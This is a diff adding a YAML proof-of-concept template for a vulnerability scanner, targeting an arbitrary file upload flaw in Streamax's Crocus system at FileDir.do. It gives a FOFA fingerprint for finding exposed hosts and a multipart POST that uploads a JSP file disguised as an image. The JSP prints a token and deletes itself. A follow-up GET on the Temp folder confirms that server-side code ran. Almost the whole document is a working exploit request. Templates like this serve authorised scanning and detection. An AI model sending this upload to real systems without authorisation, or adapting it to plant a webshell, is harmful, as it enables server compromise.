@@ -1,0 +1,34 @@
+id: poc-yaml-crocus-filedir-do-anyfile-upload
+info:
+  name: 锐明技术 Crocus系统 FileDir.do 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: crocus
+  fofa: body="/ThirdResource/respond/respond.min.js" && title="Crocus"
+variables:
+  t1: random_str(7)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /FileDir.do?Action=Upload
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+  data: '------WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+    Content-Disposition: form-data; name="file"; filename="{{.t1}}.jsp"
+
+    Content-Type: image/jpeg
+
+
+    <% out.print("{{.t2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--'
+  expression: "status_code == 200 && \ncontains(body,\"FileName\") &&\ncontains(body,\"\
+    .jsp\")\n"
+  output:
+  - regex_match(body,"\"FileName\":\"(?P<file>.*?).jsp")
+- method: GET
+  path: /Plugin/FileManage/Temp/{{.file}}.jsp
+  expression: status_code == 200 && body == t2
+transport: http
